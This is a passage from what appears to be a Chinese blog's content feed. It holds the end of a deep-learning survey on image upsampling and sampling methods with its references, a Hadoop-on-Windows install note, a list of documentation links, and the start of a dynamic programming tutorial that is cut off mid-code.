但一些特殊的卷积神经网络结构在时序建模上也有良好的表现，比如Goolgle用于语音合成的wavenet，Facebook提出的用于翻译的卷积神经网络特殊的卷积神经网络——时序卷积网络（Temporal convolutional network， TCN）与多种RNN结构相对比，发现在多种任务上TCN都能达到甚至超过RNN模型。 </p><p>TCN相比RNN有并行性、感受野尺寸可以灵活调整、梯度稳定、占用内存更低、相比LSTM更快的特点；与之相对的，这种单向结构的TCN 在迁移学习方面适应能力较弱，并且在实际应用中仍旧受限于卷积神经网络普遍存在的因感受野而带来的某些限制。</p><h4 id="DeepTCN"><a href="#DeepTCN" class="headerlink" title="DeepTCN"></a>DeepTCN</h4><p> DeepTCN是一种基于卷积神经网络的多关联时间序列预测的概率预测模型。该模型可用于估计参数和非参数设置下的概率密度。其构建了基于膨胀因果卷积网的叠加残差块来捕获序列的时间依赖性。与表示学习相结合，能够学习复杂的模式，如季节性、系列内和跨系列的假日效应，并利用这些模式进行更准确的预测，特别是在历史数据稀少或不可用的情况下。</p><p>1.提出了一种基于卷积的预测框架，该框架同时提供了估计概率密度的参数和非参数方法。</p><p>2.该框架能够学习序列间的潜在相关性，能够处理数据稀疏、冷启动等复杂的实际预测情况，具有较高的可扩展性和可扩展性。</p><p>3.大量的实证研究表明，我们的框架优于其他最先进的方法，无论是点预测和概率预测。</p><p>4.与递归结构相比，卷积模型的计算可以完全并行化，从而达到较高的训练效率。与此同时，优化要容易得多。在我们的案例中，训练时间是文献Flunkert等(2017)报道的复发模型的1/8。</p><p>5.该模型非常灵活，可以包括外生协变量，如额外的促销计划或天气预报。</p><h3 id="3-6-卷积神经网络中的其他上采样方法"><a href="#3-6-卷积神经网络中的其他上采样方法" class="headerlink" title="3.6 卷积神经网络中的其他上采样方法"></a>3.6 卷积神经网络中的其他上采样方法</h3><h5 id="3-6-1-PixelShuffle"><a href="#3-6-1-PixelShuffle" class="headerlink" title="3.6.1 PixelShuffle"></a>3.6.1 PixelShuffle</h5><p>PixelShuffle由Redmon等人在CVPR2016中提出的一种上采样方法，其主要关注于亚像素卷积层。首先将一个H x W的低分辨率图像通过三次卷积之后变为通道数为$r^2$的特征图，然后用reshape的方法将 Hx W x r2 的特征图重组为 rH x rW 的高分辨率图像。 经过三次卷积之后输出与原图一样尺寸的r2通道的输出图，扩大的倍数刚刚好等同于通道数。这样可以让网络学习到插值方法，并存在于前三层卷积层参数中[3.6.1-1]。</p><p><img src="https://img-blog.csdnimg.cn/2019080116323060.png" srcset="/img/loading.gif" lazyload="" alt=""> </p><p>PixelShuffle相对超分辨率此前不同的超分辨率的优点在于：不需要通过线性插值来扩大特征图尺寸，以更小的卷积核获得很好的效果；并且用卷积学习比手工设计插值会有更好的拟合效果。</p><h5 id="3-6-2-DUpsampling"><a href="#3-6-2-DUpsampling" class="headerlink" title="3.6.2 DUpsampling"></a>3.6.2 DUpsampling</h5><p>​      DUpsampling是在CVPR2019年提出的一种上采样方法[3.6.2-1]，从网络结构来看和PixelShuffle有相似之处，其通过卷积学习亚像素，并最后重组来获得更大的图像。</p><p>  DUpsampling在对特征图的操作上有所不同，是先通过将单个像素所对应的C个通道reshape成一个1xC的向量，与CxN的矩阵相乘得到1xN的向量，再reshape成为2x2xN/4（2应该指的是放大倍数，即rxrxN/r2）的扩大后的亚像素块,组合成放大后的特征图。<br>  以上这两种算法都是基于数据去训练的，可以获得比线性插值更好的效果，但是与线性插值相比存在的问题是：1、对于不同的放大倍数的图像需要训练不同的网络（因为通道数的改变）；2、不容易进行连续的放大，比如1.1倍，1.2倍这样。说不容易而不是不能是因为可以适当放大输入图像或者对权重和步长进行调整后放缩，但是计算很复杂，效果没有整数倍好，线性插值却很容易办到。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122144815796.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h5 id="3-6-3-Meta-Upscale"><a href="#3-6-3-Meta-Upscale" class="headerlink" title="3.6.3 Meta-Upscale"></a>3.6.3 Meta-Upscale</h5><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122144856779.png" srcset="/img/loading.gif" lazyload="" alt=""> </p><p>   Meta-SR中的Meta-Upscale是在CVPR2019上的Meta-SR: A Magnifification-Arbitrary Network for Super-Resolution一文中提出来的，作者提出了一种可以任意尺度缩放的方法，可以实现较好效果的非整数的放缩。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122144934656.png" srcset="/img/loading.gif" lazyload="" alt="">  </p><p>   FLR 表示由特征学习模块提取的特征，并假定缩放因子是 r。对于 SR 图像上的每个像素（i, j），文中认为它由 ILR 图像上像素（i′,j′）的特征与一组相应卷积滤波器的权重所共同决定。从这一角度看，放大模块可视为从 FLR 到 ISR 的映射函数。<br>$$<br>I^{SR}(i,j)=\Phi(F^{LR}(i^{‘},j^{‘}),W(i,j))<br>$$<br>k * k为设定的与I^SR所相关的一个像素搜索范围。及这个范围内的所有像素都是和最后输出的像素是有关系的，需要对其计算相应的权重并加权计算。HWx（InCxoutC）我的理解是图像最后输出的长x宽x输入的通道数（文中为64）x输出的通道数（文中为3）做为权值生成的输出的通道数。对于一个像素的计算我们需要对64个通道上feature map上的对应9个值加权求和，就可以计算出输出的一个通道值，重复3次就是一个值的3个通道数的值，重复HW次就可以计算出整个输出。<br>   那么知道最后如何计算输出之后，我们关心的是文中提到的是怎么来做对不同的放缩大小的权值计算的以及如何在任意尺度下完成输出像素和LR特征图上的对应。<br>   作者把 Meta-Upscale 模块由三个重要的函数，即 Location Projection、Weight Prediction、Feature Mapping（这个就是上文讲的如何乘以权值得到最后的输出）。<br>   先说下文中的Location Projection，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122145040963.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>$$<br>(i^{‘},j^{‘} )=T(i,j)=([\frac{i}{r}],[\frac{j}{r}])<br>$$<br>通过向下取整使得ISR中的每一个值都可以在ILR上找到一个对应的值。如放大1.5倍，那么ILR上的0对应ISR中的0和1（0/1.5&lt;1,1/1.5&lt;1）。</p><p>   而权重预测Weight Prediction在网络中是通过构建了两层全链接层和relu来实现的，输出在上文已经讲过了就不再重复，而文中用于预测的输入是这样获得的，如下式：<br>$$<br>V_{ij}=(\frac{i}{r}-[\frac{i}{r}],\frac{j}{r}-[\frac{j}{r}],\frac{1}{r})<br>$$<br>   总结一下，Meta-SR中的思路有点像RPN，做了一个外部的推荐网络，来推荐放缩的权值及像素的对应关系，在非整数倍放大上起的不错的效果。</p><h5 id="3-6-4-CAPAFE"><a href="#3-6-4-CAPAFE" class="headerlink" title="3.6.4 CAPAFE"></a>3.6.4 CAPAFE</h5><p>​       CAPAFE是出自ICCV2019的一种内容感知并重组特征的上采样方法，结构思路与此前的上采样方法较多的不同之处。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122145107859.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>   CAPAFE的整个网络结构由两部分组成，一部分是核预测模块（Kernel Prediction Module），用于生成用于重组计算的核上的权重。另一部分是内容感知重组模块（Content-aware Reassembly Module），用于将计算到的权重将通道reshape成一个kxk的矩阵作为核与原本输入的特征图上的对应点及以其为中心点的kxk区域做卷积计算，获得输出。<br>   首先我们先关注下核预测模块是如何预测出权重值的，这一部分文中分为三部分：通道压缩器（Channel Compressor）、内容编码（Content Encoder）、核归一化（Kernel Normaliaer）。输入的Feature map通过1x1的卷积核，完成对通道数的压缩，文中提及这一步的原因是为了减少计算量，而且文中说通过实验将通道数压缩在64不会影响效果，文中给的Cm为64。之后通过多层Kenconder x Kenconder的卷积核完成对特征图的计算，输出HxWxσ2xKup2的特征图，这里Kenconder的大小与感受野有关，越大生成的权重与周围的内容的关联性越高。最后将特征图reshape成σHxσWxKup2，之后单独对每一个像素的所有通道用softmax做归一化，为了是最后生成的重组核内权重值和为1。这样权重的预测就完成了。<br>   之后将预测好的权重对每一个像素都拉成kupxkup的卷积核即图中对应的Wl，通过对（i/σ，j/σ）向下映射的方法（floor function）找到每个像素在原来的feature map上对应的点，以其为中心点构建出kupxkup的区域做卷积计算，就可以得到一个像素的输出，重复操作可以获得整个输出。<br>$$<br>X^{‘}<em>{l’}=\sum^{r}</em>{n=-r}\sum^{r}<em>{m=-r}W</em>{l’(n,m)}*X_{(i+n,j+m)}<br>$$<br>   CAPAFE的整个网络内的参数量特别少，只有Content Encoder中的NxKenconder x Kenconderxσ2xKup2的卷积核的参数，同时它的上采样思路也比较不同，当然它无法如Meta-SR那样做连续缩放。</p><h2 id="4-循环神经网络中的图像采样"><a href="#4-循环神经网络中的图像采样" class="headerlink" title="4.循环神经网络中的图像采样"></a>4.循环神经网络中的图像采样</h2><p>循环神经网络(RNN)也被称为递归神经网络，相比卷积神经网络，其有更悠久的发展历史[4-1]。其被大量用于语音识别[4-2]、机器翻译、文本/音乐生成、情感分类、DNA序列分析、视频行为识别、实体名字识别、场景标记[4-3]，可见其同样在视觉任务中有一定作用。</p><h3 id="LSTM"><a href="#LSTM" class="headerlink" title="LSTM"></a>LSTM</h3><h4 id="4-1-LSTM采样"><a href="#4-1-LSTM采样" class="headerlink" title="4.1 LSTM采样"></a>4.1 LSTM采样</h4><p>LSTM常用于自然语言处理（NLP），但其作为RNN最为经典的模型同样也可以完成图像分类任务。</p><p>在每个时间步，LSTM 都使用了 softmax 输出了一个在字符集上的概率分布。</p><p>给定每个时间步的分布，有几种方法来获得单个的字符，每个字符获得其相应的嵌入然后传递给 LSTM 作为下一步的输入：</p><ol><li>获得当前时间步最大的值</li><li>从分布中使用 softmax 采样</li><li>获取前 k 个结果，使用 beam 搜索</li></ol><h4 id="评价采样的质量"><a href="#评价采样的质量" class="headerlink" title="评价采样的质量"></a>评价采样的质量</h4><p>最简单的方法：可视化数据！诸如“the”或者“and”这样的词出现得非常频繁，即使就是训练很多的时间。随着训练的继续，样本会越来越像真的英语。</p><p>而更加形式化的性能评估就是测量 <strong>perplexity</strong> 在一个新的测试集合上。Perplexity 是测试集的逆概率，使用词的数目正规化。最小化 perplexity 和最大化概率是一样的，所以一个更低的 perplexity 模型能够更好地描述数据。Perplexity 是一种常用的度量语言模型的测度，其定义如下：<br>$$<br>PP=P(w_1w_2…w_N)^{\frac{-1}{N}}=(\prod_{i=1}^N \frac{1}{(w_i|w_1w_2…w_{i-1})})<br>$$<br>其中的 $$w_1, …, w_N$$ 是训练数据的整个序列；我们将整个这些看成是一个序列。在 bigram 模型中，条件是截断的，$PP==(\prod_{i=1}^N \frac{1}{(P(w_i|w_{i-1})})^{\frac{1}{N}}$</p><p>在实践中，我们没有测试集，所以就不会测量 perplexity，我们训练的字符层的模型。perplexity 通常用在词层的语言模型上。</p><p>相比Bi-LSTM，LSTM的结构很适合社交网络等文本分析等并应用于推荐系统。</p><h3 id="4-2-SRCNN"><a href="#4-2-SRCNN" class="headerlink" title="4.2 SRCNN"></a>4.2 SRCNN</h3><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122145141623.png" srcset="/img/loading.gif" lazyload="" alt=""></p><blockquote><p>SRCNN超分辨率重建的流程:</p><p>（1）将低分辨率图像使用两/三次差值放大至目标尺寸，得到图中的输入(input)；</p><p>（2）将低分辨率图像输入到三层的卷积神经网络。例如在论文中，对YCrCb颜色空间中的Y通道重建，网络形式为(conv1+relu1)—(conv2+relu2)—(conv3)。第一层卷积：卷积核大小为9×9($f_1×f_1$)，卷积核数目64($n_1$)，输出64张特征图；第二层卷积：卷积核尺寸1×1($f_2×f_2$)，卷积核数目32($n_2$)，输出32张特征图；第三层卷积：卷积核尺寸5×5($f_3×f_3$)，卷积核数目为1($n_3$)，输出1张特征图即为最终重建高分辨率图像。</p></blockquote><h2 id="5-生成对抗网络中的图像采样"><a href="#5-生成对抗网络中的图像采样" class="headerlink" title="5.生成对抗网络中的图像采样"></a>5.生成对抗网络中的图像采样</h2><p>生成对抗网络（GAN）是在2014年Goodfellow在提出的一种基于概率与统计理论并借鉴博弈思想的深度学习模型[5-1]，目前已经出现C-GAN、Info-GAN、DC-GAN、W-GAN/W-GAN-GP、f-GAN、Big-GAN、EB-GAN、SR-GAN/ESR-GAN等多种变体[5-2]，其在生成图像数据集、 生成人脸照片 、 生成现实照片 、 生成动画角色 、 图像转换 、 文字-图片转化 、 语义图像-图片转化 、 生成正面人像图片 、 生成新体态 、 图片转表情 、 图片编辑 、 图像融合 、 超分辨率 、视频预测、 3D打印等方面已经有了相应的应用[5-3]。</p><h3 id="5-1-GAN"><a href="#5-1-GAN" class="headerlink" title="5.1 GAN"></a>5.1 GAN</h3><p>GAN由服从可以不需要或只需要少量的数据标注即可生成有效的高维数据，其通过生成数据的生成模型和估计样本是训练数据的概率的判别模型之间不断博弈获得高维度的生成数据。</p><p>生成模型的训练程序是将判别模型判断错误的概率最大化，当判别模型将来自生成模型的数据判断正确率接近50%时，即认为判别模型已无法判断生成的数据是否正确。在G和D由多层感知器定义的情况下，整个系统可以用反向传播进行训练。在训练或生成样本期间，不需要任何马尔科夫链或展开的近似推理网络。[1] 。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/41a59b4bd87f50222e05277057b34ce.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>GAN的主要灵感来源于博弈论中零和博弈的思想，应用到深度学习神经网络上来说，就是通过生成网络G（Generator）和判别网络D（Discriminator）不断博弈，进而使G学习到数据的分布，如果用到图片生成上，则训练完成后，G可以从一段随机数中生成逼真的图像。G， D的主要功能是：</p><p>● G是一个生成网络，它生成一个随机的噪声z（随机数），通过这个噪声生成图像 。对于给定的输入x和输出y，生成模型学习到其映射关系，其联合分布概率$p(x,y)$,由贝叶斯定理知在已知$p(x)$和$p(x|y)$可得到$p(y|x)$。</p><p>● D是一个判别网络，判别一张图片是不是“真实的”。它的输入参数是x，x代表一张图片，输出D（x）代表x为真实图片的概率，如果为1，就代表100%是真实的图片，而输出为0，就代表不可能是真实的图片</p><p>训练过程中，生成网络G的目标就是尽量生成真实的图片去欺骗判别网络D。而D的目标就是尽量辨别出G生成的假图像和真实的图像。这样，G和D构成了一个动态的“博弈过程”，最终的平衡点即纳什均衡点。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>没啥好看的。。。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1-01] Lecun Y , Bengio Y , Hinton G . Deep learning[J]. nature, 2015, 521(7553):436.</p><p>[1-02] Krizhevsky, A., Sutskever, I. and Hinton, G. (2012) ImageNet Classification with Deep Convolutional Neural Networks. Advances in Neural Information Processing Systems, 25, 1097-1105.</p><p>[1-03]  Khan A, Sohail A, Zahoora U, et al. A survey of the recent architectures of deep convolutional neural networks[J]. arXiv preprint arXiv:1901.06032, 2019. </p><p> [1-04] 袁非牛, 章琳, 史劲亭,等. Theories and Applications of Auto-Encoder Neural Networks: A Literature Survey%自编码神经网络理论及应用综述[J]. 计算机学报, 2019, 042(001):203-230. </p><p>[1-05]  Sabour, Sara, Nicholas Frosst, and Geoffrey E. Hinton. “Dynamic routing between capsules.” <em>Advances in neural information processing systems</em>. 2017. </p><p>[1-06]  Hochreiter, Sepp, and Jürgen Schmidhuber. “Long short-term memory.” <em>Neural computation</em> 9.8 (1997): 1735-1780. </p><p>[1-07] Minar M R , Naher J . Recent Advances in Deep Learning: An Overview[J]. 2018. </p><p>[2-01] Keys, Robert. “Cubic convolution interpolation for digital image processing.” <em>IEEE transactions on acoustics, speech, and signal processing</em> 29.6 (1981): 1153-1160. </p><p>[2-02]  张智邦, 李桂清, 韦国栋,等. 形状插值算法综述[J]. 计算机辅助设计与图形学学报, 2015(08):38-49. </p><p>[2-03] Chen, Shenchang Eric, and Lance Williams. “View interpolation for image synthesis.” <em>Proceedings of the 20th annual conference on Computer graphics and interactive techniques</em>. 1993. </p><p>[2-04] Carey, W. Knox, Daniel B. Chuang, and Sheila S. Hemami. “Regularity-preserving image interpolation.” <em>IEEE transactions on image processing</em> 8.9 (1999): 1293-1297. </p><p>[2-05] Lehmann, Thomas Martin, Claudia Gonner, and Klaus Spitzer. “Survey: Interpolation methods in medical image processing.” <em>IEEE transactions on medical imaging</em> 18.11 (1999): 1049-1075. </p><p>[2-06] Hou, Hsieh, and H. Andrews. “Cubic splines for image interpolation and digital filtering.” <em>IEEE Transactions on acoustics, speech, and signal processing</em> 26.6 (1978): 508-517. </p><p>[2-07] Thévenaz, Philippe, Thierry Blu, and Michael Unser. “Image interpolation and resampling.” <em>Handbook of medical imaging, processing and analysis</em> 1.1 (2000): 393-420. </p><p>[2-08]  Dodgson, Neil A. “Quadratic interpolation for image resampling.” <em>IEEE transactions on image processing</em> 6.9 (1997): 1322-1326. </p><p>[2-09]  Hwang, Jung Woo, and Hwang Soo Lee. “Adaptive image interpolation based on local gradient features.” <em>IEEE signal processing letters</em> 11.3 (2004): 359-362. </p><p>[2-10]   Dong, Weisheng, et al. “Sparse representation based image interpolation with nonlocal autoregressive modeling.” <em>IEEE Transactions on Image Processing</em> 22.4 (2013): 1382-1394. </p><p>[3-01]  Krizhevsky A, Sutskever I, Hinton G E. Imagenet classification with deep convolutional neural networks[C]//Advances in neural information processing systems. 2012: 1097-1105. </p><p>[ ]:AlexNet</p><p>[3-02]  Simonyan K, Zisserman A. Very deep convolutional networks for large-scale image recognition[J]. arXiv preprint arXiv:1409.1556, 2014. </p><p>[ ]:VGG</p><p>[3-03]  Szegedy C, Liu W, Jia Y, et al. Going deeper with convolutions[C]//Proceedings of the IEEE conference on computer vision and pattern recognition. 2015: 1-9. </p><p>[ ]:GoogLetNet</p><p>[3-04] He K , Zhang X , Ren S , et al. Deep Residual Learning for Image Recognition[C]// IEEE Conference on Computer Vision &amp; Pattern Recognition. IEEE Computer Society, 2016.</p><p>[3-05]  Sun, Ke, et al. “Igcv3: Interleaved low-rank group convolutions for efficient deep neural networks.” <em>arXiv preprint arXiv:1806.00178</em> (2018). </p><p>[3-06] 陈超, 齐峰. 卷积神经网络的发展及其在计算机视觉领域中的应用综述[J]. 计算机科学, 2019, 46(03):69-79. </p><p>[3.1-1]  Masci, Jonathan, et al. “Stacked convolutional auto-encoders for hierarchical feature extraction.” <em>International conference on artificial neural networks</em>. Springer, Berlin, Heidelberg, 2011. </p><p>[3.2.1-1]  Vincent, O. Rebecca, and Olusegun Folorunso. “A descriptive algorithm for sobel image edge detection.” <em>Proceedings of Informing Science &amp; IT Education Conference (InSITE)</em>. Vol. 40. California: Informing Science Institute, 2009. </p><p>[3.2.3-1]  Zeiler, Matthew D., et al. “Deconvolutional networks.” <em>2010 IEEE Computer Society Conference on computer vision and pattern recognition</em>. IEEE, 2010. </p><p>[3.2.3-2]  Zeiler, Matthew D., Graham W. Taylor, and Rob Fergus. “Adaptive deconvolutional networks for mid and high level feature learning.” <em>2011 International Conference on Computer Vision</em>. IEEE, 2011. </p><p>[3.2.3-3]  Zeiler, Matthew D., and Rob Fergus. “Visualizing and understanding convolutional networks.” <em>European conference on computer vision</em>. Springer, Cham, 2014. </p><p>[3.2.6-1]  Larsson, Gustav, Michael Maire, and Gregory Shakhnarovich. “Fractalnet: Ultra-deep neural networks without residuals.” <em>arXiv preprint arXiv:1605.07648</em> (2016). </p><p>[3.2.6-2]  <a href="https://arxiv.org/abs/1605.07146" target="_blank" rel="noopener">Zagoruyko, Sergey, and Nikos Komodakis. “Wide residual networks.” <em>arXiv preprint arXiv:1605.07146</em> (2016).</a></p><p>[3.2.6-3] Xie, Saining, et al. “Aggregated residual transformations for deep neural networks.” <em>Proceedings of the IEEE conference on computer vision and pattern recognition</em>. 2017. </p><p>[3.2.6-4]  Huang, Gao, et al. “Densely connected convolutional networks.” <em>Proceedings of the IEEE conference on computer vision and pattern recognition</em>. 2017. </p><p>[3.2.6-5] Redmon, Joseph, and Ali Farhadi. “Yolov3: An incremental improvement.” <em>arXiv preprint arXiv:1804.02767</em> (2018). </p><p>[3-07] [Yu, Fisher, Vladlen Koltun, and Thomas Funkhouser. “Dilated residual networks.” <em>Proceedings of the IEEE conference on computer vision and pattern recognition</em>. 2017. ](</p><p>[3.2.7-1] Yu, Fisher, Koltun, Vladlen. Multi-Scale Context Aggregation by Dilated Convolutions[J]. </p><p>[3.2.7 -2] Understanding the Effective Receptive Field in Deep Convolutional Neural Networks，Wenjie Luo, Yujia Li, Raquel Urtasun, Richard Zemel </p><p>[3.2.8-1]  Redmon, Joseph, et al. “You only look once: Unified, real-time object detection.” <em>Proceedings of the IEEE conference on computer vision and pattern recognition</em>. 2016. </p><p>[3.2.8-2]  Redmon, Joseph, and Ali Farhadi. “YOLO9000: better, faster, stronger.” <em>Proceedings of the IEEE conference on computer vision and pattern recognition</em>. 2017. </p><p>[3.3-1]  Long, Jonathan, Evan Shelhamer, and Trevor Darrell. “Fully convolutional networks for semantic segmentation.” <em>Proceedings of the IEEE conference on computer vision and pattern recognition</em>. 2015. </p><p> Lecun Y , Bottou L . Gradient-based learning applied to document recognition[J]. Proceedings of the IEEE, 1998, 86(11):P.2278-2324. </p><p>[3.6.1-1]  Shi W , Caballero J , Ferenc Huszár, et al. Real-time single image and video super-resolution using an efficient sub-pixel convolutional neural network[J]. 2016. </p><p>[3.6.2-1]  Tian, Zhi, et al. “Decoders matter for semantic segmentation: Data-dependent decoding enables flexible feature aggregation.” <em>Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition</em>. 2019. </p><p> [3.6.4-3]  Hu, Xuecai, et al. “Meta-SR: a magnification-arbitrary network for super-resolution.” <em>Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition</em>. 2019. </p><p> [3.6.4-1]  Wang, Jiaqi, et al. “CARAFE: Content-Aware ReAssembly of FEatures.” <em>Proceedings of the IEEE International Conference on Computer Vision</em>. 2019. </p><p>[4-1]  Salehinejad, Hojjat, et al. “Recent advances in recurrent neural networks.” <em>arXiv preprint arXiv:1801.01078</em> (2017). </p><p>[4-2] Deng, Li, Geoffrey Hinton, and Brian Kingsbury. “New types of deep neural network learning for speech recognition and related applications: An overview.” <em>2013 IEEE International Conference on Acoustics, Speech and Signal Processing</em>. IEEE, 2013. </p><p> [4-3]  Byeon, Wonmin, et al. “Scene labeling with lstm recurrent neural networks.” <em>Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition</em>. 2015. </p><p>[5-1]  Goodfellow I J , Pouget-Abadie J , Mirza M , et al. Generative Adversarial Networks[J]. Advances in Neural Information Processing Systems, 2014, 3:2672-2680. </p><p>[5-2]   朱秀昌. 生成对抗网络图像处理综述[J]. 南京邮电大学学报:自然科学版, 2019, 39(3):1-12. </p><p>[5-3]  Creswell, Antonia, et al. “Generative adversarial networks: An overview.” <em>IEEE Signal Processing Magazine</em> 35.1 (2018): 53-65. </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win10安装Hadoop以及pyspark</title>
      <link href="/2021/05/10/win10%E5%AE%89%E8%A3%85Hadoop%E4%BB%A5%E5%8F%8Apyspark/"/>
      <url>/2021/05/10/win10%E5%AE%89%E8%A3%85Hadoop%E4%BB%A5%E5%8F%8Apyspark/</url>
      
        <content type="html"><![CDATA[<p>win10安装Hadooop记录（安装过程与在linux环境安装类似）</p><a id="more"></a><h2 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h2><ul><li>安装</li></ul><p>建议安装版本：Hadoop3.0.0+Spark3.0.0+Hive3.1</p><p><a href="https://blog.csdn.net/qq_42754919/article/details/109402379" target="_blank" rel="noopener">windows安装Spark3.0.0+hadoop+JDK大数据开发平台_我本将心向明月丶的博客-CSDN博客</a></p><p>已编译包下载：</p><p><a href="https://github.com/steveloughran/winutils" target="_blank" rel="noopener">GitHub - steveloughran/winutils: Windows binaries for Hadoop versions (built from the git commit ID used for the ASF relase)</a></p><ul><li>启动命令（注：需要打开cmd输入命令，直接打开文件无法启动）：</li></ul><div class="hljs code-wrapper"><pre><code class="hljs shell">start-all.cmd</code></pre></div><ul><li><p>检测</p><p><strong>出现四个任务管理且不报错，并不一定说明安装成功。测试是否开启成功：输入命令<code>jps</code></strong><br>出现下面四个才能说明安装成功，如果不出现四个说明安装没有成功，可能是上面第四步出现问题，重新配置。</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20201031151402658.png#pic_center" srcset="/img/loading.gif" lazyload="" alt=""></p><ul><li><p>打开（Web端）</p><div class="hljs code-wrapper"><pre><code class="hljs shell">http://localhost:9870/</code></pre></div><p>在浏览器地址栏中输入：<a href="http://localhost:8088/" target="_blank" rel="noopener">http://localhost:8088</a>查看集群状态</p></li></ul><h2 id="Spark"><a href="#Spark" class="headerlink" title="Spark"></a>Spark</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 大数据技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
            <tag> Spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大数据官方中文文档</title>
      <link href="/2021/04/09/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%98%E6%96%B9%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3/"/>
      <url>/2021/04/09/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%98%E6%96%B9%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<p>中文学习文档（很详细）</p><a id="more"></a><ul><li><a href="https://www.docs4dev.com/docs/zh/python/3.7.2rc1/all" target="_blank" rel="noopener">Python中文文档</a></li><li><a href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference" target="_blank" rel="noopener">MySql 中文文档</a></li><li><a href="https://www.docs4dev.com/docs/zh/apache-hive/3.1.1/reference/" target="_blank" rel="noopener">Apache Hive 中文手册</a></li><li><a href="https://www.docs4dev.com/docs/zh/apache-hbase/2.1/reference" target="_blank" rel="noopener">Apache HBase 中文文档</a></li><li><a href="https://www.docs4dev.com/docs/zh/flume/1.9.0/reference" target="_blank" rel="noopener">Apache Flume 用户指南</a></li><li><a href="https://www.docs4dev.com/docs/zh/zookeeper/r3.5.6/reference" target="_blank" rel="noopener">ZooKeeper</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 大数据技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
            <tag> Hive </tag>
            
            <tag> Spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>零基础动态规划入门</title>
      <link href="/2021/04/04/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E5%85%A5%E9%97%A8/"/>
      <url>/2021/04/04/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>动态规划方法解题</p><a id="more"></a><p>动态规划分为3个部分：</p><ol><li>确定状态</li><li>转移方程</li><li>初始条件和边界情况</li></ol><ul><li><p><strong>确定状态</strong></p><p>即数列每个元素$f[i]$或矩阵每个元素$f[i][j]$代表着什么</p></li><li><p><strong>转移方程</strong></p><p>例如斐波那契数列的转移方程是$F(n) = F(n-1)+F(n-2)$，这个表示的是每个元素的关系</p></li><li><p><strong>初始条件和边界情况</strong></p><p>初始条件，例如$f[0]$等于多少</p><p>边界情况，什么时候停下，$i$的范围是多少</p><p><a href="https://zhuanlan.zhihu.com/p/356804629" target="_blank" rel="noopener">参考：肝了好多天-动态规划十连-超细腻解析</a></p></li></ul><h3 id="斐波那契问题"><a href="#斐波那契问题" class="headerlink" title="斐波那契问题"></a>斐波那契问题</h3><ul><li><a href="https://leetcode-cn.com/problems/fibonacci-number/" target="_blank" rel="noopener">509. 斐波那契数</a></li></ul><p>$$<br>F(0) = 0,F(1) = 1    \<br>F(n) = F(n-1)+F(n-2),n&gt;1<br>$$</p><p>给定$n$，计算$F(n)$</p><p>从上述问题可知，初始条件为$F(0)=1,F(1)=1$</p><p>方法一（<strong>暴力递归-深度优先搜索</strong>）：</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fib</span><span class="hljs-params">(self, n: int)</span> -&gt; int:</span>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span>:        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>    <span 